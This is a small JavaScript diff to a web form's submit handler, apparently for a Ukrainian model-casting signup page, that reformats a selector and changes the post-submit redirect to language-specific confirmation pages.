@@ -1,6 +1,8 @@
 const form = document.querySelector("form");
 const files = form.querySelectorAll("input[type=file]");
-const textInputs = form.querySelectorAll("input[type=text], input[type=tel], select");
+const textInputs = form.querySelectorAll(
+  "input[type=text], input[type=tel], select"
+);
 
 async function sendImg(file) {
   const userId = "-4199673025";
@@ -48,8 +50,14 @@ form.addEventListener("submit", async (event) => {
   // Відправляємо текстові дані форми
   await sendTextData(formData);
 
-  // Перенаправляємо на сторінку form.php
-  window.location.replace("form.php");
+  // Перенаправляємо на сторінку
+  const currentPath = window.location.pathname;
+
+  if (currentPath.includes("you-are-model-ua")) {
+    window.location.replace("confirmation-ua.html");
+  } else {
+    window.location.replace("confirmation.html");
+  }
 });
 
 files.forEach((file) => {
